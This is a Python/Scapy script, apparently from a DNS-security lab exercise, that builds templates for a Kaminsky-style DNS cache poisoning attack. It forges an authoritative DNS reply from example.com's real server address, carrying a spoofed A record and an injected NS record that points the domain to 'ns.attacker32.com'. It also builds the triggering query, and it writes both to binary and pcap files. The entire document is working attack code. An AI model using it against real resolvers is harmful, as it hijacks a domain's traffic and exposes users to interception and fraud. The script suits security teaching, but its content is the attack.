from scapy.all import IP,UDP,RandShort,wrpcap
from scapy.layers.dns import DNSQR,DNS,DNSRR

domain = 'example.com'
name = 'twysw.example.com'
ns = "ns.attacker32.com"
qdesc = DNSQR(qname=name)
anssec = DNSRR(rrname=name,type='A',rdata='1.1.2.2',ttl=259200)
nssec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
dns = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=qdesc, an=anssec, ns=nssec)

ip = IP(dst='10.9.0.53',src='93.184.216.34',chksum=0)
udp = UDP(dport=33333,sport=53,chksum=0)

pkt = ip/udp/dns

with open('ip_resp.bin','wb') as f:
    f.write(bytes(pkt))

qdesc = DNSQR(qname=name)
dns = DNS(id = 0xAAAA, qr=0,qdcount=1,qd=qdesc)
ip = IP(dst='10.9.0.53',src='1.2.3.4')
udp = UDP(dport=53,sport=RandShort(),chksum=0)

request = ip/udp/dns

with open('ip_req.bin','wb') as f:
    f.write(bytes(request))
wrpcap('ip_req.pcap',request)
wrpcap('ip_resp.pcap',pkt)
